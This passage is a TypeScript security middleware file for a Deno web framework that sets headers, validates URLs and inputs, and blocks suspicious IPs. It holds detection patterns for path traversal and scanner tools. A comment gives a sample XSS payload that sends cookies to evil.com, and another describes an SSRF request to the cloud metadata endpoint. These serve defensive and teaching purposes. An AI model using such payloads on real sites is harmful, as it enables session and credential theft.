// middleware/security.ts → Enterprise Security System

import type { Context } from "../utils/context.ts";
// ================================================================================
// 🔒 DenoGenesis Framework - Advanced Security Middleware
// Comprehensive security headers, policies, and protection mechanisms
// ================================================================================
//
// UNIX PHILOSOPHY IMPLEMENTATION:
// --------------------------------
// 1. DO ONE THING WELL:
//    - This module ONLY handles security headers and request validation
//    - Does NOT handle authentication, authorization, or business logic
//    - Single, focused responsibility: protect against web vulnerabilities
//
// 2. COMPOSABILITY:
//    - Designed as middleware that integrates with Oak framework
//    - Can be combined with logging, error handling, rate limiting
//    - Security utilities can be used independently
//
// 3. TEXT-BASED:
//    - All configuration via simple objects
//    - HTTP headers are text-based
//    - Security policies in standard formats
//
// 4. EXPLICIT:
//    - Clear security headers
//    - No hidden protections
//    - Every header has a documented purpose
//
// ARCHITECTURE:
// -------------
// Security Flow:
//   1. Request arrives
//   2. Validate request path (path traversal check)
//   3. Check for malicious patterns
//   4. Set security response headers
//   5. Pass to next middleware
//   6. Headers protect response in browser
//
// OWASP TOP 10 COVERAGE:
// ----------------------
// 1. Injection: Input sanitization, CSP
// 2. Broken Authentication: Secure headers, HSTS
// 3. Sensitive Data Exposure: HSTS, secure cookies
// 4. XML External Entities: CSP, input validation
// 5. Broken Access Control: CORS, frame options
// 6. Security Misconfiguration: Default secure settings
// 7. XSS: CSP, XSS protection header, input sanitization
// 8. Insecure Deserialization: Input validation
// 9. Known Vulnerabilities: Up-to-date headers
// 10. Insufficient Logging: Security monitoring included
//
// SECURITY HEADERS EXPLAINED:
// ---------------------------
// - CSP: Prevents XSS by controlling resource loading
// - HSTS: Forces HTTPS, prevents protocol downgrade attacks
// - X-Frame-Options: Prevents clickjacking attacks
// - X-Content-Type-Options: Prevents MIME type sniffing
// - Referrer-Policy: Controls referrer information leakage
// - Permissions-Policy: Restricts browser features
//
// THREAT MODEL:
// -------------
// Protects against:
// - Cross-Site Scripting (XSS)
// - Clickjacking
// - MIME type attacks
// - Man-in-the-Middle (MITM)
// - Path traversal attacks
// - Malicious bots and scanners
// - Protocol downgrade attacks
//
// USAGE:
// ------
// ```typescript
// import { createSecurityMiddleware, SecurityPresets } from "./middleware/security.ts";
//
// const app = new Application();
//
// // Add security middleware EARLY in the stack
// app.use(createSecurityMiddleware({
//   environment: 'production',
//   ...SecurityPresets.BALANCED
// }));
//
// // Or use standalone utilities
// const isValid = SecurityValidator.isValidUrl('https://example.com');
// const token = SecurityValidator.generateSecureToken(32);
// ```
//
// RELATED DOCUMENTATION:
// ----------------------
// - Framework Philosophy: docs/02-framework/philosophy.md
// - Middleware Architecture: docs/04-api-reference/core/middleware.md
// - OWASP Guidelines: https://owasp.org/www-project-top-ten/
// - CSP Reference: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
// - Security Headers: https://securityheaders.com/
//
// ================================================================================

// ================================================================================
// 📦 TYPE DEFINITIONS
// ================================================================================

/**
 * Security configuration object
 *
 * DESIGN PHILOSOPHY:
 * - Secure by default (all protections enabled unless disabled)
 * - Environment-aware (production vs development)
 * - Flexible (can be customized per application needs)
 * - Standards-compliant (follows OWASP and W3C recommendations)
 *
 * CONFIGURATION STRATEGY:
 * - Production: Maximum security, strict policies
 * - Development: Relaxed for debugging, allow unsafe-eval
 * - Testing: Minimal security for speed
 *
 * @interface SecurityConfig
 */
export interface SecurityConfig {
  /**
   * Runtime environment (development, production, testing)
   * Determines default security settings
   * @type {string}
   */
  environment: string;

  /**
   * Content Security Policy directive
   *
   * CSP EXPLANATION:
   * ----------------
   * CSP is the most powerful security header. It tells the browser:
   * - Which scripts can execute
   * - Which stylesheets can load
   * - Which resources can be fetched
   * - Which frames can be embedded
   *
   * EXAMPLE:
   * "default-src 'self'; script-src 'self' https://cdn.example.com"
   *
   * BREAKDOWN:
   * - default-src 'self': Only load resources from same origin by default
   * - script-src 'self' https://cdn.example.com: Scripts only from self or CDN
   *
   * WHY IMPORTANT?
   * - Primary defense against XSS attacks
   * - Prevents injection of malicious scripts
   * - Mitigates data exfiltration
   *
   * @default Secure default based on environment
   * @type {string}
   */
  contentSecurityPolicy?: string;

  /**
   * Enable HTTP Strict Transport Security
   *
   * HSTS EXPLANATION:
   * -----------------
   * HSTS tells browsers: "Always use HTTPS, never HTTP"
   *
   * HOW IT WORKS:
   * 1. Server sends HSTS header
   * 2. Browser remembers for max-age seconds
   * 3. Browser automatically converts http:// to https://
   * 4. Browser rejects invalid certificates
   *
   * WHY IMPORTANT?
   * - Prevents protocol downgrade attacks
   * - Protects against SSL stripping
   * - Mandatory for handling sensitive data
   *
   * HEADER FORMAT:
   * Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
   *
   * @default true in production, false in development
   * @type {boolean}
   */
  enableHSTS?: boolean;

  /**
   * X-Frame-Options setting
   *
   * CLICKJACKING EXPLAINED:
   * -----------------------
   * Clickjacking = Attacker tricks user into clicking invisible iframe
   *
   * ATTACK SCENARIO:
   * 1. Attacker creates malicious page
   * 2. Embeds victim site in invisible iframe
   * 3. User thinks they're clicking attacker's button
   * 4. Actually clicking button in hidden iframe
   *
   * X-FRAME-OPTIONS VALUES:
   * - DENY: Never allow framing (most secure)
   * - SAMEORIGIN: Allow framing only from same domain
   * - ALLOW-FROM: Allow framing from specific domain (deprecated)
   *
   * @default 'DENY'
   * @type {'DENY' | 'SAMEORIGIN' | 'ALLOW-FROM'}
   */
  frameOptions?: "DENY" | "SAMEORIGIN" | "ALLOW-FROM";

  /**
   * Enable X-Content-Type-Options: nosniff
   *
   * MIME SNIFFING EXPLAINED:
   * ------------------------
   * MIME sniffing = Browser guesses content type instead of trusting server
   *
   * ATTACK SCENARIO:
   * 1. Attacker uploads file named "image.jpg"
   * 2. File actually contains JavaScript
   * 3. Server says Content-Type: image/jpeg
   * 4. Browser sniffs content, sees JavaScript
   * 5. Browser executes malicious script
   *
   * nosniff PREVENTS THIS:
   * - Browser trusts Content-Type header
   * - Won't execute scripts disguised as images
   * - Blocks mismatched content types
   *
   * @default true
   * @type {boolean}
   */
  enableNoSniff?: boolean;

  /**
   * Enable X-XSS-Protection header
   *
   * XSS FILTER EXPLAINED:
   * ---------------------
   * Legacy browser feature that detects and blocks XSS attacks
   *
   * HOW IT WORKS:
   * 1. Browser analyzes request parameters
   * 2. Compares with response content
   * 3. If request params appear in response, blocks rendering
   *
   * HEADER VALUES:
   * - 0: Disabled
   * - 1: Enabled (sanitizes page)
   * - 1; mode=block: Enabled (blocks page entirely)
   *
   * NOTE:
   * - Modern browsers removed this feature
   * - CSP is the modern replacement
   * - Still useful for older browsers
   *
   * @default true
   * @type {boolean}
   */
  enableXSSProtection?: boolean;

  /**
   * Referrer-Policy setting
   *
   * REFERRER EXPLAINED:
   * -------------------
   * Referrer = URL of the page that linked to current page
   *
   * PRIVACY CONCERN:
   * - Referrers leak browsing history
   * - Can expose sensitive URLs
   * - Third parties can track users
   *
   * POLICY VALUES:
   * - no-referrer: Never send referrer
   * - same-origin: Only send for same-origin requests
   * - strict-origin: Only send origin (not full URL)
   * - strict-origin-when-cross-origin: Full URL for same-origin, origin for cross-origin
   *
   * EXAMPLE:
   * User at https://bank.com/account/12345 clicks link to https://evil.com
   * - no-referrer: evil.com sees nothing
   * - origin: evil.com sees https://bank.com
   * - unsafe-url: evil.com sees https://bank.com/account/12345 (BAD!)
   *
   * @default 'strict-origin-when-cross-origin'
   * @type {string}
   */
  referrerPolicy?: string;

  /**
   * Permissions-Policy header
   *
   * PERMISSIONS POLICY EXPLAINED:
   * -----------------------------
   * Controls which browser features can be used
   *
   * WHY RESTRICT FEATURES?
   * - Reduces attack surface
   * - Prevents accidental feature usage
   * - Improves privacy
   * - Reduces resource usage
   *
   * EXAMPLE RESTRICTIONS:
   * - camera=(): No access to camera
   * - microphone=(): No access to microphone
   * - geolocation=(): No access to location
   *
   * FORMAT:
   * feature=(self "https://trusted.com")
   * - () = Nobody can use it
   * - (self) = Only same origin
   * - (self "url") = Same origin and specific URL
   *
   * @default Restrictive policy
   * @type {string}
   */
  permissionsPolicy?: string;

  /**
   * Custom security headers
   *
   * USE CASES:
   * - Application-specific headers
   * - Compliance requirements
   * - Additional protections
   *
   * @type {Record<string, string>}
   */
  customHeaders?: Record<string, string>;
}

// ================================================================================
// 🛡️ SECURITY MIDDLEWARE FACTORY
// ================================================================================

/**
 * Create security middleware for Oak framework
 *
 * MIDDLEWARE ARCHITECTURE:
 * ------------------------
 * This middleware:
 * 1. Validates incoming requests (path traversal, malicious patterns)
 * 2. Blocks dangerous requests
 * 3. Sets security headers on responses
 * 4. Tracks suspicious activity
 * 5. Passes clean requests to next middleware
 *
 * PLACEMENT IN STACK:
 * Should be added EARLY (after logging, before authentication)
 *
 * ```typescript
 * app.use(loggingMiddleware);
 * app.use(securityMiddleware);  // HERE
 * app.use(authMiddleware);
 * app.use(router);
 * ```
 *
 * PERFORMANCE:
 * - O(1) header setting
 * - O(n) regex matching (n = URL length)
 * - Minimal overhead (<1ms typical)
 *
 * @public
 * @param {SecurityConfig} config - Security configuration
 * @returns {Function} Security middleware function
 *
 * @example
 * ```typescript
 * import { createSecurityMiddleware, SecurityPresets } from "./security.ts";
 * import { compose } from "./middleware.ts";
 *
 * const security = createSecurityMiddleware({
 *   environment: 'production',
 *   ...SecurityPresets.BALANCED,
 * });
 * const handler = compose([security], () => new Response("ok"));
 * ```
 */
export function createSecurityMiddleware(config: SecurityConfig) {
  return async (
    ctx: Context,
    next: () => Promise<Response>,
  ): Promise<Response> => {
    const path = ctx.url.pathname;
    const clientIp =
      ctx.request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
      ctx.request.headers.get("x-real-ip") ??
      "unknown";
    const stagedHeaders = new Headers();

    // ==========================================================================
    // PHASE 1: REQUEST VALIDATION
    // ==========================================================================

    const maliciousPathPatterns = [
      /\.\./,
      /\0/,
      /%2e%2e/i,
      /%00/i,
      /\/etc\/passwd/i,
      /\/proc\//i,
      /\\windows\\system32/i,
    ];

    if (maliciousPathPatterns.some((pattern) => pattern.test(path))) {
      console.error(
        `🚨 Path traversal attempt detected: ${path} from ${clientIp}`,
      );
      SecurityMonitor.trackSuspiciousActivity(clientIp);

      const body = {
        error: "Bad Request",
        message: "Invalid request path",
        timestamp: new Date().toISOString(),
      };

      return new Response(JSON.stringify(body), {
        status: 400,
        headers: new Headers({ "Content-Type": "application/json" }),
      });
    }

    const userAgent = ctx.request.headers.get("User-Agent") || "";
    const suspiciousPatterns = [
      /sqlmap/i,
      /nmap/i,
      /nikto/i,
      /dirb/i,
      /dirbuster/i,
      /burpsuite/i,
      /masscan/i,
      /zap/i,
    ];

    if (suspiciousPatterns.some((pattern) => pattern.test(userAgent))) {
      console.warn(
        `🚨 Suspicious request detected: ${userAgent} from ${clientIp}`,
      );
      SecurityMonitor.trackSuspiciousActivity(clientIp);
      stagedHeaders.set("X-Security-Warning", "Request flagged for review");
    }

    // ==========================================================================
    // PHASE 2: PROCESS REQUEST AND APPLY HEADERS
    // ==========================================================================

    const response = await next();
    const headers = new Headers(response.headers);

    stagedHeaders.forEach((value, key) => headers.set(key, value));

    headers.set("X-Frame-Options", config.frameOptions || "DENY");

    if (config.enableNoSniff !== false) {
      headers.set("X-Content-Type-Options", "nosniff");
    }

    if (config.enableXSSProtection !== false) {
      headers.set("X-XSS-Protection", "1; mode=block");
    }

    headers.set(
      "Referrer-Policy",
      config.referrerPolicy || "strict-origin-when-cross-origin",
    );

    const defaultPermissionsPolicy = [
      "accelerometer=()",
      "ambient-light-sensor=()",
      "autoplay=()",
      "battery=()",
      "camera=()",
      "cross-origin-isolated=()",
      "display-capture=()",
      "document-domain=()",
      "encrypted-media=()",
      "execution-while-not-rendered=()",
      "execution-while-out-of-viewport=()",
      "fullscreen=()",
      "geolocation=()",
      "gyroscope=()",
      "keyboard-map=()",
      "magnetometer=()",
      "microphone=()",
      "midi=()",
      "navigation-override=()",
      "payment=()",
      "picture-in-picture=()",
      "publickey-credentials-get=()",
      "screen-wake-lock=()",
      "sync-xhr=()",
      "usb=()",
      "web-share=()",
      "xr-spatial-tracking=()",
    ].join(", ");

    headers.set(
      "Permissions-Policy",
      config.permissionsPolicy || defaultPermissionsPolicy,
    );

    if (config.contentSecurityPolicy) {
      headers.set("Content-Security-Policy", config.contentSecurityPolicy);
    } else if (config.environment === "production") {
      const defaultCSP = [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://cdn.skypack.dev https://cdn.jsdelivr.net",
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com data:",
        "img-src 'self' data: https: blob:",
        "media-src 'self' data: https:",
        "connect-src 'self'",
        "object-src 'none'",
        "base-uri 'self'",
        "form-action 'self'",
        "frame-ancestors 'none'",
        "upgrade-insecure-requests",
      ].join("; ");

      headers.set("Content-Security-Policy", defaultCSP);
    } else {
      const devCSP = [
        "default-src 'self'",
        "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdnjs.cloudflare.com https://cdn.skypack.dev https://cdn.jsdelivr.net",
        "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
        "font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com data:",
        "img-src 'self' data: https: blob:",
        "media-src 'self' data: https:",
        "connect-src 'self' ws: wss: http://localhost:* http://127.0.0.1:*",
        "object-src 'none'",
        "base-uri 'self'",
      ].join("; ");

      headers.set("Content-Security-Policy", devCSP);
    }

    if (config.environment === "production" && config.enableHSTS !== false) {
      headers.set(
        "Strict-Transport-Security",
        "max-age=31536000; includeSubDomains; preload",
      );
    }

    headers.delete("Server");
    headers.set("Server", "DenoGenesis/4.0");

    headers.set("X-Permitted-Cross-Domain-Policies", "none");

    if (path.includes("/api/")) {
      headers.set("Cross-Origin-Resource-Policy", "cross-origin");
    } else {
      headers.set("Cross-Origin-Resource-Policy", "same-origin");
    }

    headers.set("Cross-Origin-Opener-Policy", "same-origin");
    headers.set("Cross-Origin-Embedder-Policy", "unsafe-none");
    headers.set("X-DNS-Prefetch-Control", "off");

    if (config.customHeaders) {
      Object.entries(config.customHeaders).forEach(([key, value]) => {
        headers.set(key, value);
      });
    }

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers,
    });
  };
}

// ================================================================================
// 🔍 SECURITY VALIDATOR UTILITIES
// ================================================================================

/**
 * Security validation utilities
 *
 * DESIGN PRINCIPLES:
 * - Pure functions (no side effects)
 * - Composable (can be used independently)
 * - Defensive (handle edge cases)
 * - Standards-compliant
 *
 * @class SecurityValidator
 * @static
 *
 * @example
 * ```typescript
 * // Validate URL
 * const isValid = SecurityValidator.isValidUrl('https://example.com');
 *
 * // Sanitize input
 * const safe = SecurityValidator.sanitizeInput('<script>alert("XSS")</script>');
 * // Result: "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"
 *
 * // Generate token
 * const token = SecurityValidator.generateSecureToken(32);
 * ```
 */
export class SecurityValidator {
  /**
   * Validate URL format and optionally check against whitelist
   *
   * URL VALIDATION STRATEGY:
   * ------------------------
   * 1. Parse URL with built-in URL constructor
   * 2. Check protocol (http/https only)
   * 3. Optionally check against domain whitelist
   *
   * WHY VALIDATE URLs?
   * - Prevent open redirects
   * - Stop SSRF attacks
   * - Ensure safe navigation
   *
   * OPEN REDIRECT ATTACK:
   * User clicks: https://bank.com/login?redirect=https://evil.com
   * After login → redirected to evil.com
   * User thinks they're on bank.com
   * Enters credentials on fake site
   *
   * SSRF ATTACK:
   * App fetches user-provided URL
   * Attacker provides: http://169.254.169.254/latest/meta-data
   * App fetches internal cloud metadata
   * Attacker steals AWS credentials
   *
   * @public
   * @static
   * @param {string} url - URL to validate
   * @param {string[]} allowedDomains - Optional domain whitelist
   * @returns {boolean} True if URL is valid and safe
   *
   * @example
   * ```typescript
   * // Basic validation
   * SecurityValidator.isValidUrl('https://example.com');  // true
   * SecurityValidator.isValidUrl('javascript:alert(1)');  // false
   * SecurityValidator.isValidUrl('ftp://files.com');      // false
   *
   * // With whitelist
   * SecurityValidator.isValidUrl('https://example.com', ['example.com']);     // true
   * SecurityValidator.isValidUrl('https://sub.example.com', ['example.com']); // true
   * SecurityValidator.isValidUrl('https://evil.com', ['example.com']);        // false
   * ```
   */
  static isValidUrl(url: string, allowedDomains?: string[]): boolean {
    try {
      // Parse URL (throws if invalid)
      const parsedUrl = new URL(url);

      // -----------------------------------------------------------------------
      // PROTOCOL CHECK
      // -----------------------------------------------------------------------

      /**
       * ALLOWED PROTOCOLS:
       * - http: Standard web protocol
       * - https: Secure web protocol
       *
       * BLOCKED PROTOCOLS:
       * - javascript: Code execution (javascript:alert(1))
       * - data: Base64 encoded content (data:text/html,<script>...</script>)
       * - file: Local file access (file:///etc/passwd)
       * - ftp: File transfer (not web)
       * - tel: Telephone number (not web)
       * - mailto: Email address (not web)
       */
      if (!["http:", "https:"].includes(parsedUrl.protocol)) {
        return false;
      }

      // -----------------------------------------------------------------------
      // DOMAIN WHITELIST CHECK
      // -----------------------------------------------------------------------

      /**
       * DOMAIN WHITELIST:
       * -----------------
       * If provided, URL must be from allowed domain
       *
       * MATCHING RULES:
       * - Exact match: example.com matches example.com
       * - Subdomain match: sub.example.com matches if example.com allowed
       *
       * EXAMPLES:
       * Whitelist: ['example.com']
       * - https://example.com → ALLOWED (exact match)
       * - https://www.example.com → ALLOWED (subdomain)
       * - https://api.example.com → ALLOWED (subdomain)
       * - https://examplecom.evil.com → BLOCKED (not subdomain)
       * - https://evil.com → BLOCKED (different domain)
       */
      if (allowedDomains && allowedDomains.length > 0) {
        return allowedDomains.some((domain) =>
          parsedUrl.hostname === domain || // Exact match
          parsedUrl.hostname.endsWith("." + domain) // Subdomain match
        );
      }

      // No whitelist provided, URL is valid
      return true;
    } catch {
      // URL parsing failed, invalid URL
      return false;
    }
  }

  /**
   * Sanitize input to prevent XSS attacks
   *
   * XSS (CROSS-SITE SCRIPTING) EXPLAINED:
   * --------------------------------------
   * Attacker injects malicious script into web page
   *
   * ATTACK EXAMPLE:
   * User submits: <script>fetch('https://evil.com?cookie='+document.cookie)</script>
   * App displays: Welcome, <script>fetch(...)!</script>
   * Browser executes script
   * User's cookies sent to attacker
   *
   * SANITIZATION STRATEGY:
   * ----------------------
   * Replace dangerous characters with HTML entities
   *
   * CHARACTER MAPPINGS:
   * - < → &lt;     (prevents opening tags)
   * - > → &gt;     (prevents closing tags)
   * - " → &quot;   (prevents attribute injection)
   * - ' → &#x27;   (prevents attribute injection)
   * - & → &amp;    (prevents entity injection)
   *
   * EXAMPLE:
   * Input:  <script>alert('XSS')</script>
   * Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
   *
   * BROWSER RENDERING:
   * Browser displays literal text, doesn't execute
   *
   * LIMITATIONS:
   * - Only sanitizes HTML entities
   * - Doesn't prevent all XSS (use CSP too)
   * - Not suitable for rich text (use DOMPurify)
   *
   * @public
   * @static
   * @param {string} input - User input to sanitize
   * @returns {string} Sanitized string safe for HTML
   *
   * @example
   * ```typescript
   * SecurityValidator.sanitizeInput('<script>alert("XSS")</script>');
   * // Returns: "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"
   *
   * SecurityValidator.sanitizeInput('Hello <b>World</b>');
   * // Returns: "Hello &lt;b&gt;World&lt;/b&gt;"
   *
   * SecurityValidator.sanitizeInput('He said "Hello"');
   * // Returns: "He said &quot;Hello&quot;"
   * ```
   */
  static sanitizeInput(input: string): string {
    return input.replace(/[<>'"&]/g, (char) => {
      // Entity mapping object
      const entities: Record<string, string> = {
        "<": "&lt;", // Less than
        ">": "&gt;", // Greater than
        '"': "&quot;", // Double quote
        "'": "&#x27;", // Single quote (&#39; also works)
        "&": "&amp;", // Ampersand
      };

      // Return entity or original character
      return entities[char] || char;
    });
  }

  /**
   * Validate Content-Type for file uploads
   *
   * FILE UPLOAD SECURITY:
   * ---------------------
   * Never trust file extensions or user-provided content types
   *
   * ATTACK SCENARIOS:
   * 1. Malicious File Upload:
   *    - Attacker uploads "image.jpg"
   *    - File actually contains PHP code
   *    - Server executes as script
   *    - Attacker gains shell access
   *
   * 2. MIME Confusion:
   *    - Attacker uploads HTML file
   *    - Server thinks it's image
   *    - Browser renders as HTML
   *    - Executes embedded JavaScript
   *
   * VALIDATION STRATEGY:
   * 1. Check Content-Type header
   * 2. Validate against whitelist
   * 3. Additional checks (magic bytes) recommended
   *
   * SAFE CONTENT TYPES (DEFAULT):
   * - Images: image/jpeg, image/png, image/gif, image/webp
   * - Documents: text/plain, application/pdf
   *
   * DANGEROUS TYPES TO AVOID:
   * - application/x-php
   * - text/html
   * - application/javascript
   * - application/x-sh
   *
   * @public
   * @static
   * @param {string} contentType - Content-Type header value
   * @param {string[]} allowedTypes - Optional custom whitelist
   * @returns {boolean} True if content type is safe
   *
   * @example
   * ```typescript
   * // Using default safe types
   * SecurityValidator.isValidContentType('image/jpeg');  // true
   * SecurityValidator.isValidContentType('text/html');   // false
   *
   * // Using custom whitelist
   * SecurityValidator.isValidContentType('application/json', [
   *   'application/json',
   *   'text/plain'
   * ]);  // true
   * ```
   */
  static isValidContentType(
    contentType: string,
    allowedTypes: string[] = [],
  ): boolean {
    // Use default safe types if no custom list provided
    if (allowedTypes.length === 0) {
      allowedTypes = [
        "image/jpeg", // JPEG images
        "image/png", // PNG images
        "image/gif", // GIF images
        "image/webp", // WebP images
        "text/plain", // Plain text
        "application/pdf", // PDF documents
      ];
    }

    // Check if content type is in whitelist (case-insensitive)
    return allowedTypes.includes(contentType.toLowerCase());
  }

  /**
   * Generate a cryptographically secure random token
   *
   * TOKEN GENERATION:
   * -----------------
   * Uses Web Crypto API for cryptographically secure randomness
   *
   * WHY CRYPTOGRAPHICALLY SECURE?
   * - Math.random() is predictable
   * - Attackers can guess Math.random() output
   * - crypto.getRandomValues() uses OS entropy
   * - Impossible to predict
   *
   * ENTROPY SOURCES:
   * - Hardware random number generators
   * - Mouse movements
   * - Keyboard timing
   * - System interrupts
   * - Network packet timing
   *
   * USE CASES:
   * - Session tokens
   * - CSRF tokens
   * - API keys
   * - Password reset tokens
   * - Email verification tokens
   *
   * TOKEN FORMAT:
   * - Hexadecimal string
   * - 2 characters per byte
   * - length=32 → 64 character string → 256 bits of entropy
   *
   * SECURITY LEVELS:
   * - 16 bytes (128 bits): Minimum for session tokens
   * - 32 bytes (256 bits): Recommended for most uses
   * - 64 bytes (512 bits): Maximum security
   *
   * @public
   * @static
   * @param {number} length - Number of random bytes (default: 32)
   * @returns {string} Hexadecimal random token
   *
   * @example
   * ```typescript
   * // Generate 256-bit token (default)
   * const token = SecurityValidator.generateSecureToken();
   * // Returns: "a1b2c3d4e5f6..." (64 characters)
   *
   * // Generate 128-bit token
   * const shortToken = SecurityValidator.generateSecureToken(16);
   * // Returns: "a1b2c3d4..." (32 characters)
   *
   * // Use for session token
   * const sessionId = SecurityValidator.generateSecureToken(32);
   * ctx.cookies.set('sessionId', sessionId, { httpOnly: true, secure: true });
   * ```
   */
  static generateSecureToken(length: number = 32): string {
    // Create typed array for random bytes
    const array = new Uint8Array(length);

    // Fill with cryptographically secure random values
    // Uses OS entropy source
    crypto.getRandomValues(array);

    // Convert each byte to hex string
    // byte → hex (2 chars) → join all
    // Example: [255, 128] → "ff80"
    return Array.from(array, (byte) =>
      byte.toString(16) // Convert to hex
        .padStart(2, "0") // Ensure 2 digits (01 not 1)
    ).join("");
  }

  /**
   * Validate API key format
   *
   * API KEY VALIDATION:
   * -------------------
   * Basic format validation for API keys
   *
   * VALIDATION RULES:
   * - Minimum 32 characters (128 bits if random)
   * - Alphanumeric plus underscore and hyphen
   * - No spaces or special characters
   *
   * REGEX BREAKDOWN:
   * ^[A-Za-z0-9_-]{32,}$
   *
   * - ^ = Start of string
   * - [A-Za-z0-9_-] = Allowed characters
   * - {32,} = At least 32 characters
   * - $ = End of string
   *
   * WHY THESE RULES?
   * - 32+ chars = Sufficient entropy
   * - Limited charset = URL-safe
   * - No spaces = Easy to use in headers
   *
   * LIMITATIONS:
   * - Only validates format
   * - Doesn't check if key is valid/active
   * - Doesn't verify against database
   *
   * @public
   * @static
   * @param {string} apiKey - API key to validate
   * @returns {boolean} True if format is valid
   *
   * @example
   * ```typescript
   * SecurityValidator.isValidApiKey('abc123def456ghi789jkl012mno345pq');  // true (32+ chars)
   * SecurityValidator.isValidApiKey('short');                             // false (too short)
   * SecurityValidator.isValidApiKey('has spaces in it!!!');               // false (invalid chars)
   * SecurityValidator.isValidApiKey('valid-api-key_with-symbols123456'); // true
   * ```
   */
  static isValidApiKey(apiKey: string): boolean {
    // Format: At least 32 alphanumeric/underscore/hyphen characters
    return /^[A-Za-z0-9_-]{32,}$/.test(apiKey);
  }
}

// ================================================================================
// 🚨 SECURITY MONITORING
// ================================================================================

/**
 * Security monitoring and threat tracking
 *
 * RESPONSIBILITY:
 * ---------------
 * - Track suspicious activity by IP
 * - Auto-block IPs with too many incidents
 * - Provide security statistics
 * - Manual block/unblock capabilities
 *
 * DESIGN PRINCIPLES:
 * ------------------
 * - Static class (singleton pattern)
 * - Shared state across all requests
 * - Thread-safe (JavaScript is single-threaded)
 * - Automatic cleanup (prevents memory leaks)
 *
 * MEMORY MANAGEMENT:
 * ------------------
 * - Suspicious IPs: Map grows with unique IPs
 * - Blocked IPs: Set grows with blocked IPs
 * - Auto-cleanup: Keeps top 500 when >1000
 * - Typical footprint: ~10-50KB
 *
 * @class SecurityMonitor
 * @static
 *
 * @example
 * ```typescript
 * // Track suspicious activity
 * SecurityMonitor.trackSuspiciousActivity('192.168.1.100');
 *
 * // Check if IP is blocked
 * if (SecurityMonitor.isBlocked('192.168.1.100')) {
 *   ctx.response.status = 403;
 *   return;
 * }
 *
 * // Get statistics
 * const stats = SecurityMonitor.getSecurityStats();
 * console.log(`Blocked IPs: ${stats.blockedIPs}`);
 *
 * // Manual unblock
 * SecurityMonitor.unblockIP('192.168.1.100');
 * ```
 */
export class SecurityMonitor {
  /**
   * Map of IP addresses to incident count
   *
   * STRUCTURE:
   * Map {
   *   "192.168.1.100" => 5,
   *   "10.0.0.50" => 12,
   *   "172.16.0.1" => 3
   * }
   *
   * WHY MAP?
   * - O(1) lookup
   * - O(1) insertion
   * - Easy to sort by count
   *
   * @private
   * @static
   * @type {Map<string, number>}
   */
  private static suspiciousActivity: Map<string, number> = new Map();

  /**
   * Set of blocked IP addresses
   *
   * STRUCTURE:
   * Set {
   *   "10.0.0.50",
   *   "203.0.113.45"
   * }
   *
   * WHY SET?
   * - O(1) lookup
   * - O(1) insertion
   * - No duplicates
   * - Faster than Array.includes()
   *
   * @private
   * @static
   * @type {Set<string>}
   */
  private static blockedIPs: Set<string> = new Set();

  /**
   * Track suspicious activity from an IP address
   *
   * ALGORITHM:
   * 1. Get current incident count for IP
   * 2. Increment count
   * 3. Store updated count
   * 4. If count >= 10, auto-block IP
   *
   * AUTO-BLOCK THRESHOLD:
   * - 10 suspicious requests = auto-block
   *
   * WHY 10?
   * - Low enough to block attackers quickly
   * - High enough to avoid false positives
   * - Configurable if needed
   *
   * WHAT COUNTS AS SUSPICIOUS?
   * - Path traversal attempts
   * - Attack tool user agents
   * - SQL injection patterns
   * - Any security validation failure
   *
   * @public
   * @static
   * @param {string} ip - IP address to track
   * @returns {void}
   *
   * @example
   * ```typescript
   * // In security middleware
   * if (maliciousPattern.test(path)) {
   *   SecurityMonitor.trackSuspiciousActivity(ctx.request.ip);
   * }
   *
   * // After 10 incidents, IP is auto-blocked
   * ```
   */
  static trackSuspiciousActivity(ip: string): void {
    // Get current count (0 if not exists)
    const current = this.suspiciousActivity.get(ip) || 0;

    // Increment and store
    this.suspiciousActivity.set(ip, current + 1);

    // Check if threshold reached
    if (current + 1 >= 10) {
      // Add to blocked list
      this.blockedIPs.add(ip);

      // Log the block
      console.error(
        `🚨 IP ${ip} has been auto-blocked due to suspicious activity`,
      );
    }
  }

  /**
   * Check if an IP address is blocked
   *
   * ALGORITHM:
   * Simple Set.has() lookup - O(1) time complexity
   *
   * USAGE:
   * Check at start of request processing
   * Block request immediately if IP is blocked
   *
   * @public
   * @static
   * @param {string} ip - IP address to check
   * @returns {boolean} True if IP is blocked
   *
   * @example
   * ```typescript
   * // In middleware
   * if (SecurityMonitor.isBlocked(ctx.request.ip)) {
   *   ctx.response.status = 403;
   *   ctx.response.body = { error: 'Access denied' };
   *   return;
   * }
   * ```
   */
  static isBlocked(ip: string): boolean {
    return this.blockedIPs.has(ip);
  }

  /**
   * Get comprehensive security statistics
   *
   * STATISTICS PROVIDED:
   * - Total suspicious IPs
   * - Total blocked IPs
   * - Top 10 most suspicious IPs (sorted by incident count)
   * - Timestamp of stats generation
   *
   * USE CASES:
   * - Security dashboards
   * - Monitoring alerts
   * - Incident reports
   * - Trend analysis
   *
   * @public
   * @static
   * @returns {Object} Security statistics
   *
   * @example
   * ```typescript
   * const stats = SecurityMonitor.getSecurityStats();
   *
   * console.log(`Total suspicious IPs: ${stats.suspiciousIPs}`);
   * console.log(`Total blocked IPs: ${stats.blockedIPs}`);
   *
   * stats.topSuspiciousIPs.forEach(({ ip, incidents }) => {
   *   console.log(`${ip}: ${incidents} incidents`);
   * });
   * ```
   */
  static getSecurityStats() {
    return {
      // Total number of IPs with suspicious activity
      suspiciousIPs: this.suspiciousActivity.size,

      // Total number of blocked IPs
      blockedIPs: this.blockedIPs.size,

      // Top 10 most suspicious IPs sorted by incident count
      topSuspiciousIPs: Array.from(this.suspiciousActivity.entries())
        .sort(([, a], [, b]) => b - a) // Sort descending by count
        .slice(0, 10) // Take top 10
        .map(([ip, count]) => ({ ip, incidents: count })),

      // When these stats were generated
